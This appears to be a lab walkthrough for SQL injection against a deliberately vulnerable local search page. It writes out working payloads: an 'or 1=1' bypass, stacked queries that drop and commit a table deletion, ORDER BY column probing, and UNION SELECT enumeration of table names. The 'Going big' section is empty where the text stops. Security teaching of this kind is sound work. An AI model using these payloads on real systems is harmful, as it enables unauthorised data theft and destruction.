
# ============================================================================
# SQL Injection
# ATTACK EXAMPLES & TESTING ENDPOINTS
# ============================================================================


## Starting small

1. Navigate to dashboard->search (http://127.0.0.1:5000/search)

2. Try a simple search first on basic search (just press search)

3. The try simple search with a single company name, and one with a wrong name.

4. Try the same company name in advanced search to check that it all works

5. On advanced search, try `company_name' or 1=1 --` (replace company_name with the one you searched for)

6. Now try `company_name' drop table transactions --` and `company_name'; drop table transactions; --` Doesn't work though...

7. Then try this `company_name'; drop table transactions; commit --` 

8. If you executed the step `7`, then you need to go to your setup script, stop everything (option `5`), delete the data (option `6`) and rebuild (option `1`)

9. Now try this `' UNION SELECT tablename, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM pg_tables WHERE schemaname='public'--`

10. Make a sequence of queries to find number of returned columns
```
test' ORDER BY 1--
test' ORDER BY 2--
test' ORDER BY 3--
test' ORDER BY 4--
test' ORDER BY 5--
...continue until error...

```
When you get an error like "ORDER BY position X is not in select list", then X-1 is your column count.

11. Now try this `' UNION SELECT tablename, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM pg_tables WHERE schemaname='public'--`

12. Now try this `' UNION SELECT 1, 1, tablename, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM pg_tables WHERE schemaname='public'--`

13. The returned data is one exact record multiple times. There is a limitation to the sql injection because the query code is trying to convert results back to Transaction objects. Shows how bad application logic can accidentally limit injection impact. The code is very much vulnerable to SQL injection, but the results are not returned in the clear form.

## Going big
